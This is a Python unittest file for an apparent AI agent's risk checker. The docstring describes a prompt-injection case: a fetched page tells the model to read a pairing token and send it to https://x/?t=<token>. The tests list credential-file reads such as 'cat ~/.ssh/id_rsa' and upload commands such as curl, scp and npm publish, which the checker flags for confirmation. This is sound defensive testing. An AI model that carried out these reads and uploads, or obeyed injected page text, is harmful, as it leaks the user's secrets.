"""Secrets and what leaves the Mac. A page fetched by the model could tell it to read the
phone pairing token and then fetch https://x/?t=<token>: neither step asked. And an
upload with curl, an scp to another machine or a package publish were not destructive,
so nothing ever asked about them either."""
import os, sys, unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin"))
import qqcore as q


class Base(unittest.TestCase):
    def setUp(self):
        self.addCleanup(setattr, q.TURN_CTX, "read_secret", getattr(q.TURN_CTX, "read_secret", False))
        q.TURN_CTX.read_secret = False


class TestReadingSecrets(Base):
    def test_keys_and_tokens_ask(self):
        for path in ("~/.ssh/id_ed25519", "~/.aws/credentials", os.path.join(q.CONFIG, "remote-token"),
                     os.path.join(q.CONFIG, "secrets.json"), "/tmp/proj/.env", "/tmp/proj/.env.local"):
            with self.subTest(path=path):
                q.TURN_CTX.read_secret = False
                level, why = q.risk_check("read_file", {"path": path})
                self.assertEqual(level, "confirm", path)
                self.assertIn("secret", why)

    def test_so_does_cat_in_the_shell(self):
        self.assertEqual(q.risk_check("run_shell", {"command": "cat ~/.ssh/id_rsa"})[0], "confirm")

    def test_ordinary_files_do_not(self):
        for path in ("~/.ssh/known_hosts", "~/.ssh/config", "/tmp/proj/README.md", "/tmp/proj/environment.yml"):
            with self.subTest(path=path):
                self.assertIsNone(q.risk_check("read_file", {"path": path})[0])

    def test_after_a_secret_a_request_out_asks(self):
        self.assertIsNone(q.risk_check("fetch_url", {"url": "https://example.com"})[0])
        q.risk_check("read_file", {"path": os.path.join(q.CONFIG, "remote-token")})
        level, why = q.risk_check("fetch_url", {"url": "https://example.com/?t=abc"})
        self.assertEqual(level, "confirm"); self.assertIn("read a secret", why)


class TestSendingThingsOut(Base):
    def test_uploads_copies_and_publishing_ask(self):
        for cmd in ("curl -F file=@notes.txt https://x.example/upload",
                    "curl -d @data.json https://api.example.com/items",
                    "curl -X DELETE https://api.example.com/items/3",
                    "scp results.csv lab:/data/", "rsync -a out/ host:backup/",
                    "npm publish", "twine upload dist/*", "docker push me/img"):
            with self.subTest(cmd=cmd):
                self.assertEqual(q.risk_check("run_shell", {"command": cmd})[0], "confirm", cmd)

    def test_everyday_network_use_does_not(self):
        for cmd in ("curl -s https://api.github.com/repos/x/y", "git push origin main", "git pull",
                    "rsync -a src/ dst/", "gh pr view 12", "pip install requests"):
            with self.subTest(cmd=cmd):
                self.assertIsNone(q.risk_check("run_shell", {"command": cmd})[0], cmd)


if __name__ == "__main__":
    unittest.main()
